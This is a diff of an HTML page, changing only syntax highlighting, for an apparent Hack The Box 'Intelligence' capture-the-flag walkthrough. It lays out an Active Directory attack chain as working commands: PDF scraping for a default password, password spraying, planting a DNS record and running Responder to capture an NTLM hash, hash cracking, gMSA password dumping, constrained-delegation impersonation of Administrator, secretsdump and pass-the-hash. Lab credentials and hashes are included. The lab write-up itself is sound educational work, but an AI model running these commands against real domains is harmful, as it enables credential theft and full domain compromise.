-        &quot;2020-06-04-upload.pdf&quot;,
-        &quot;2020-06-07-upload.pdf&quot;,
-        &quot;2020-06-03-upload.pdf&quot;,
-        &quot;2020-06-02-upload.pdf&quot;,
-        &quot;2020-07-08-upload.pdf&quot;,
-        &quot;2020-07-06-upload.pdf&quot;,
-        &quot;2020-07-02-upload.pdf&quot;,
-        &quot;2020-07-24-upload.pdf&quot;,
-        &quot;2020-07-20-upload.pdf&quot;,
-        &quot;2020-08-20-upload.pdf&quot;,
-        &quot;2020-08-19-upload.pdf&quot;,
-        &quot;2020-08-09-upload.pdf&quot;,
-        &quot;2020-08-01-upload.pdf&quot;,
-        &quot;2020-08-03-upload.pdf&quot;,
-        &quot;2020-09-05-upload.pdf&quot;,
-        &quot;2020-09-04-upload.pdf&quot;,
-        &quot;2020-09-02-upload.pdf&quot;,
-        &quot;2020-09-06-upload.pdf&quot;,
-        &quot;2020-09-29-upload.pdf&quot;,
-        &quot;2020-09-27-upload.pdf&quot;,
-        &quot;2020-09-22-upload.pdf&quot;,
-        &quot;2020-09-16-upload.pdf&quot;,
-        &quot;2020-09-11-upload.pdf&quot;,
-        &quot;2020-09-13-upload.pdf&quot;,
-        &quot;2020-09-30-upload.pdf&quot;,
-        &quot;2020-10-05-upload.pdf&quot;,
-        &quot;2020-10-19-upload.pdf&quot;,
-        &quot;2020-11-10-upload.pdf&quot;,
-        &quot;2020-11-06-upload.pdf&quot;,
-        &quot;2020-11-03-upload.pdf&quot;,
-        &quot;2020-11-01-upload.pdf&quot;,
-        &quot;2020-11-13-upload.pdf&quot;,
-        &quot;2020-11-11-upload.pdf&quot;,
-        &quot;2020-11-30-upload.pdf&quot;,
-        &quot;2020-11-24-upload.pdf&quot;,
-        &quot;2020-12-15-upload.pdf&quot;,
-        &quot;2020-12-10-upload.pdf&quot;,
-        &quot;2020-12-30-upload.pdf&quot;,
-        &quot;2020-12-28-upload.pdf&quot;,
-        &quot;2020-12-24-upload.pdf&quot;,
-        &quot;2020-12-20-upload.pdf&quot;
-        ]
+<span class="n">files</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;2020-01-04-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-02-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-01-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-10-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-22-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-30-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-25-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-23-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-01-20-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-02-11-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-02-28-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-02-24-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-02-23-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-02-17-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-03-04-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-03-05-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-03-12-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-03-21-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-03-17-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-03-13-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-04-04-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-04-02-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-04-23-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-04-15-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-07-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-03-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-01-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-24-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-29-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-21-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-20-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-17-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-05-11-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-21-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-30-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-28-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-25-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-26-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-22-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-15-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-14-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-12-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-08-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-04-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-07-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-03-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-06-02-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-07-08-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-07-06-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-07-02-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-07-24-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-07-20-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-08-20-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-08-19-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-08-09-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-08-01-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-08-03-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-05-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-04-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-02-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-06-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-29-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-27-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-22-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-16-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-11-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-13-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-09-30-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-10-05-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-10-19-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-10-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-06-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-03-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-01-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-13-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-11-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-30-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-11-24-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-12-15-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-12-10-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-12-30-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-12-28-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-12-24-upload.pdf&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;2020-12-20-upload.pdf&quot;</span>
+        <span class="p">]</span>
 
-for i in files: 
-        with fitz.open(i) as doc:
-            text = &quot;&quot;
-            for page in doc: 
-                text += page.getText()
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span> 
+        <span class="k">with</span> <span class="n">fitz</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">as</span> <span class="n">doc</span><span class="p">:</span>
+            <span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+            <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">doc</span><span class="p">:</span> 
+                <span class="n">text</span> <span class="o">+=</span> <span class="n">page</span><span class="o">.</span><span class="n">getText</span><span class="p">()</span>
 
-        print(text)
-</code></pre>
+        <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>By running the script and go through the output we will identify the password which is <code>NewIntelligenceCorpUser9876</code></p>
 <p><img alt="" src="../assets/image-20210705125941161.png" /></p>
 <h2 id="password-spray">Password Spray</h2>
 <p>With the obtained password, now we can run password spray against the collected domain users: </p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.248 -u users.txt -p &quot;NewIntelligenceCorpUser9876&quot;
-</code></pre>
+<div class="highlight"><pre><span></span><code>crackmapexec smb <span class="m">10</span>.10.10.248 -u users.txt -p <span class="s2">&quot;NewIntelligenceCorpUser9876&quot;</span>
+</code></pre></div>
 <p><img alt="" src="../assets/image-20210704221856446.png" /></p>
 <p>We obtained user <code>tiffany.molina</code> credentials. Now we can get <code>user.txt</code> from users shared file using <code>smbclient</code>. </p>
-<pre><code class="language-bash">smbclient \\\\10.10.10.248\\Users -U 'workgroup\Tiffany.Molina'
-</code></pre>
+<div class="highlight"><pre><span></span><code>smbclient <span class="se">\\\\</span><span class="m">10</span>.10.10.248<span class="se">\\</span>Users -U <span class="s1">&#39;workgroup\Tiffany.Molina&#39;</span>
+</code></pre></div>
 <p><img alt="" src="../assets/image-20210704222025924.png" /></p>
 <h2 id="pivot-to-tedgraves">Pivot to <code>Ted.Graves</code></h2>
 <h3 id="smb-shares-enumeration">SMB Shares Enumeration</h3>
 <p>The domain user <code>Tiffany.Molina</code> have also access to <code>IT</code> shared folder, let's inspect it. </p>
-<pre><code class="language-bash">Ξ Intelligence/dump → smbclient \\\\10.10.10.248\\IT -U 'workgroup\Tiffany.Molina' 
-Enter WORKGROUP\Tiffany.Molina's password: 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Sun Apr 18 20:50:55 2021
-  ..                                  D        0  Sun Apr 18 20:50:55 2021
-  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
+<div class="highlight"><pre><span></span><code>Ξ Intelligence/dump → smbclient <span class="se">\\\\</span><span class="m">10</span>.10.10.248<span class="se">\\</span>IT -U <span class="s1">&#39;workgroup\Tiffany.Molina&#39;</span> 
+Enter WORKGROUP<span class="se">\T</span>iffany.Molina<span class="err">&#39;</span>s password: 
+Try <span class="s2">&quot;help&quot;</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> ls
+  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">18</span> <span class="m">20</span>:50:55 <span class="m">2021</span>
+  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">18</span> <span class="m">20</span>:50:55 <span class="m">2021</span>
+  downdetector.ps1                    A     <span class="m">1046</span>  Sun Apr <span class="m">18</span> <span class="m">20</span>:50:55 <span class="m">2021</span>
 
-        3770367 blocks of size 4096. 1362603 blocks available
-smb: \&gt; get downdetector.ps1 
-</code></pre>
+        <span class="m">3770367</span> blocks of size <span class="m">4096</span>. <span class="m">1362603</span> blocks available
+smb: <span class="se">\&gt;</span> get downdetector.ps1 
+</code></pre></div>
 <p>I found Powershell script inside <code>IT</code> shared folder. </p>
 <p>By inspecting the Powershell script, I identified that the script runs every 5 minutes, it makes a request to web server that contains <code>web*</code>. </p>
-<pre><code class="language-powershell"># Check web server status. Scheduled to run every 5min
-Import-Module ActiveDirectory 
-foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Where-Object Name -like &quot;web*&quot;)  {
-try {
-$request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentials
-if(.StatusCode -ne 200) {
-Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject &quot;Host: $($record.Name) is down&quot;
-}
-} catch {}
-}
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="c"># Check web server status. Scheduled to run every 5min</span>
+<span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span> 
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$record</span> <span class="k">in</span> <span class="nb">Get-ChildItem</span> <span class="s2">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="o">-like</span> <span class="s2">&quot;web*&quot;</span><span class="p">)</span>  <span class="p">{</span>
+<span class="k">try</span> <span class="p">{</span>
+<span class="nv">$request</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://</span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">&quot;</span> <span class="n">-UseDefaultCredentials</span>
+<span class="k">if</span><span class="p">(.</span><span class="n">StatusCode</span> <span class="o">-ne</span> <span class="n">200</span><span class="p">)</span> <span class="p">{</span>
+<span class="nb">Send-MailMessage</span> <span class="n">-From</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-To</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-Subject</span> <span class="s2">&quot;Host: </span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> is down&quot;</span>
+<span class="p">}</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div>
 <h4 id="obtain-tedgraves-ntlm-hash">Obtain <code>Ted.Graves</code> NTLM Hash</h4>
 <p>We can abuse this by adding a DNS record using <code>dnstool</code> and run <code>Responder</code> to receive the NTLM hash of the user <code>ted.graves</code>. </p>
 <blockquote>
 <p><code>dnstool</code> can be found <a href="https://github.com/dirkjanm/krbrelayx">here</a></p>
 </blockquote>
-<pre><code class="language-bash">python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add -r websomething.intelligence.htb -d 10.10.14.x 10.10.10.248
-</code></pre>
+<div class="highlight"><pre><span></span><code>python3 dnstool.py -u <span class="s1">&#39;intelligence.htb\Tiffany.Molina&#39;</span> -p NewIntelligenceCorpUser9876 --action add -r websomething.intelligence.htb -d <span class="m">10</span>.10.14.x <span class="m">10</span>.10.10.248
+</code></pre></div>
 <p><img alt="" src="../assets/image-20210704221727841.png" /></p>
 <p>Then run <code>responder</code> to receive the NTLM hash</p>
-<pre><code class="language-bash">sudo responder -I tun0
-</code></pre>
+<div class="highlight"><pre><span></span><code>sudo responder -I tun0
+</code></pre></div>
 <p><img alt="" src="../assets/image-20210704221644619.png" /></p>
 <h4 id="obtain-tedgraves-password">Obtain <code>Ted.Graves</code> Password</h4>
 <p>Now we found the NTLM hash of the user <code>ted.graves</code>, we can use <code>hashcat</code> to crack it: </p>
-<pre><code class="language-bash">hashcat -a 0 -m 5600 ted.graves-ntlm  /usr/share/wordlists/rockyou.txt --force
-</code></pre>
+<div class="highlight"><pre><span></span><code>hashcat -a <span class="m">0</span> -m <span class="m">5600</span> ted.graves-ntlm  /usr/share/wordlists/rockyou.txt --force
+</code></pre></div>
 <p><img alt="" src="../assets/image-20210705174539364.png" /></p>
 <h3 id="enumerate-the-domain-controller">Enumerate the Domain Controller</h3>
 <h4 id="running-bloodhound">Running BloodHound</h4>
@@ -741,8 +741,8 @@ Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted
 <p>We can use <code>bloodhound-python</code> in Kali, but I prefer to use the Windows Powershell version because it give us more accurate results. </p>
 <blockquote>
 <p>To use <code>bloodhound-python</code> use the following command: </p>
-<p><code>bash
-bloodhound-python -u 'ted.graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -c all  --dns-tcp</code></p>
+<div class="highlight"><pre><span></span><code>bloodhound-python -u <span class="s1">&#39;ted.graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -ns <span class="m">10</span>.10.10.248 -d intelligence.htb -c all  --dns-tcp
+</code></pre></div>
 <p>But it will not give you all attack paths.  </p>
 </blockquote>
 <p><img alt="" src="../assets/image-20210704130313909.png" /></p>
@@ -755,48 +755,48 @@ bloodhound-python -u 'ted.graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="abuse-gmsa-password">Abuse gMSA Password</h3>
 <p>Again we can use Kali or Windows to abuse this misconfiguration. I used Windows to obtain <code>SVC_INT</code> NTLM hash using the following command: </p>
-<pre><code class="language-c#">$gmsa = Get-ADServiceAccount -Identity 'SVC_INT' -Properties 'msDS-ManagedPassword' -Server 10.10.10.248
-$blob = $gmsa.'msDS-ManagedPassword'
-$mp = ConvertFrom-ADManagedPasswordBlob $blob
-$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="n">gmsa</span> <span class="p">=</span> <span class="n">Get</span><span class="p">-</span><span class="n">ADServiceAccount</span> <span class="p">-</span><span class="n">Identity</span> <span class="err">&#39;</span><span class="n">SVC_INT</span><span class="err">&#39;</span> <span class="p">-</span><span class="n">Properties</span> <span class="err">&#39;</span><span class="n">msDS</span><span class="p">-</span><span class="n">ManagedPassword</span><span class="err">&#39;</span> <span class="p">-</span><span class="n">Server</span> <span class="m">10.10</span><span class="p">.</span><span class="m">10.248</span>
+<span class="err">$</span><span class="n">blob</span> <span class="p">=</span> <span class="err">$</span><span class="n">gmsa</span><span class="p">.</span><span class="err">&#39;</span><span class="n">msDS</span><span class="p">-</span><span class="n">ManagedPassword</span><span class="err">&#39;</span>
+<span class="err">$</span><span class="n">mp</span> <span class="p">=</span> <span class="n">ConvertFrom</span><span class="p">-</span><span class="n">ADManagedPasswordBlob</span> <span class="err">$</span><span class="n">blob</span>
+<span class="err">$</span><span class="n">hash1</span> <span class="p">=</span>  <span class="n">ConvertTo</span><span class="p">-</span><span class="n">NTHash</span> <span class="p">-</span><span class="n">Password</span> <span class="err">$</span><span class="n">mp</span><span class="p">.</span><span class="n">SecureCurrentPassword</span>
+</code></pre></div>
 <p>Or from Kali Linux we can use <code>gMSADumper</code> from this <a href="https://github.com/micahvandeusen/gMSADumper">link</a></p>
-<pre><code class="language-bash">python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb 
+<div class="highlight"><pre><span></span><code>python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb 
 svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
-</code></pre>
+</code></pre></div>
 <p>We found domain user <code>SVC_INT</code> NTLM hash which is <code>d64b83fe606e6d3005e20ce0ee932fe2</code> </p>
 <h3 id="abuse-constrained-delegation">Abuse Constrained Delegation</h3>
 <p>First of all, we need to find which service that <code>SVC_INT</code> can access. We can use <code>rpcclient</code> from Kali or <code>Get-DomainComputer</code> from <code>PowerView</code> module. </p>
 <p>I found that the domain user <code>SVC_INT</code> can access the service <code>www/dc.intelligence.htb</code>. </p>
 <p>Now we have service which we can abuse to request a Kerberos tickets to exploit delegation configuration. We can use Impackets <code>getST.py</code> to impersonate the administrator by passing flag <code>-impersonate</code>. </p>
-<pre><code class="language-bash">getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
-Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
+<div class="highlight"><pre><span></span><code>getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright <span class="m">2020</span> SecureAuth Corporation
 
-[*] Getting TGT for user
-[*] Impersonating Administrator
-[*]     Requesting S4U2self
-[*]     Requesting S4U2Proxy
-[*] Saving ticket in Administrator.ccache
-</code></pre>
+<span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
+<span class="o">[</span>*<span class="o">]</span> Impersonating Administrator
+<span class="o">[</span>*<span class="o">]</span>     Requesting S4U2self
+<span class="o">[</span>*<span class="o">]</span>     Requesting S4U2Proxy
+<span class="o">[</span>*<span class="o">]</span> Saving ticket <span class="k">in</span> Administrator.ccache
+</code></pre></div>
 <blockquote>
 <p>Before running the command make sure Kali time is sync with the target machine. </p>
-<p><code>bash
-sudo ntpdate 10.10.10.248</code></p>
+<div class="highlight"><pre><span></span><code>sudo ntpdate <span class="m">10</span>.10.10.248
+</code></pre></div>
 </blockquote>
 <p>Obtaining administrator tickets will allow us to have full administrator privilege in the Domain Controller, we can pass the tickets to dump all domain controller NTLM hashes. But before that we have to store the into the variable <code>KRB4CCNAME</code>:</p>
-<pre><code class="language-bash">export KRB5CCNAME=Administrator.ccache   
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache   
+</code></pre></div>
 <p>Finally, I used Impacket tool <code>secretdumps.py</code> to dump all domain users hashes including the Domain Admin. </p>
-<pre><code class="language-bash">secretsdump.py -k -no-pass dc.intelligence.htb
-</code></pre>
+<div class="highlight"><pre><span></span><code>secretsdump.py -k -no-pass dc.intelligence.htb
+</code></pre></div>
 <p><img alt="" src="../assets/image-20210705190529721.png" /></p>
 <p>We will find the NTLM hash of the Domain Admin.  </p>
 <p><img alt="" src="../assets/image-20210705190506538.png" /></p>
 <p><img alt="" src="../assets/image-20210705190605625.png" /></p>
 <p>We can use Domain Admin NTLM hash as pass the hash to read <code>root.txt</code> flag using <code>crackmapexec</code> </p>
 <p><img alt="" src="../assets/image-20210705190812320.png" /></p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.248 -u administrator -H '9075113fe16cf74f7c0f9b27e882dad3' -x 'more C:\users\administrator\desktop\root.txt'
-</code></pre>
+<div class="highlight"><pre><span></span><code>crackmapexec smb <span class="m">10</span>.10.10.248 -u administrator -H <span class="s1">&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span> -x <span class="s1">&#39;more C:\users\administrator\desktop\root.txt&#39;</span>
+</code></pre></div>
 <h1 id="lesson-learned">Lesson Learned</h1>
 <ol>
 <li>Enumerating PDF documents to find users. </li>
